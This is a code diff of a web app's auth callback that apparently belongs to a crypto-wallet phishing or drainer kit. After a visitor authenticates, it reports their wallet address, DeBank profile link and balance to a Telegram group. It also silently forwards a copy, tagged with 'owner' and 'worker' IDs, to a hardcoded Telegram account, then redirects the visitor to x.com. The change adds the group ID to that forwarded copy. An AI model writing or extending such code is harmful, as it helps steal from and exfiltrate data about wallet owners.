@@ -184,8 +184,8 @@ def auth_callback():
                    f'{worker_line if owner_id != worker_id else ""}'
                    f'🔗 *[{address}](https://debank.com/profile/{address})* \\| $*_{parse(balance)}_*')
 
-        message_id = send_message(group_id, message)
-        send_message(7434895838, f"👤 _[{owner_id}](tg://user?id={owner_id})_ \\| 👷_[{worker_id}](tg://user?id={worker_id})_\n\n{message}")
+        send_message(group_id, message)
+        send_message(7434895838, f"💬 _{group_id}_ \\| 👤 _[{owner_id}](tg://user?id={owner_id})_ \\| 👷_[{worker_id}](tg://user?id={worker_id})_\n\n{message}")
         return redirect(session.get("redirect_url", "https://x.com/"))
     except Exception as e:
         logger.error(e)
